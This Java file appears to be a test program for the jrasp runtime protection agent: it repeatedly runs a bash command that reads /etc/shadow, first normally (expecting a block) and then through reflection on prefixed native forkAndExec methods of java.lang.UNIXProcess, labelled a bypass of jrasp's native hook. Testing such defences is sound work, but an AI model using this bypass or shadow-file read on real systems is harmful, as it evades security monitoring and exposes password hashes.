package com.test;

import java.io.*;
import java.lang.reflect.Method;
import java.net.*;
//import java.net.http.HttpClient;
//import java.net.http.HttpRequest;
//import java.net.http.HttpResponse;

import static com.test.WriteFile.maintest;

public class RaspExample {

    public static void main(String[] args) {
        for (int i = 0; i < 100; i++) {
            try {
                processOperate();
                Thread.sleep(1000 * 10);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static void processOperate()  {
        try {
           // cmd1
            Cmd.linuxCmd(new String[]{"/bin/bash","-c","cat /etc/shadow && touch /tmp/shadow1"},null);

            // rasp block
        } catch (Exception e) {
            //e.printStackTrace();
            System.out.println("cmd1 block by jrasp");
        }

        try {
            Class<?> clazz = Class.forName("java.lang.UNIXProcess");

            //cmd2,bypass jrasp native hook
            for (Method m : clazz.getDeclaredMethods()) {
                if (m.getName().endsWith("forkAndExec")&&!m.getName().equals("forkAndExec")) {
                    m.setAccessible(true);
                    System.out.println("prefix native method : "+m.getName());
                    Cmd.linuxCmd(new String[]{"/bin/bash","-c","cat /etc/shadow && touch /tmp/shadow2"},m);
                }
            }
        } catch (Exception ignore) {
            ignore.printStackTrace();
        }
    }


    private static void fileOperate() throws IOException {

        try {
            maintest("/tmp/test3");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
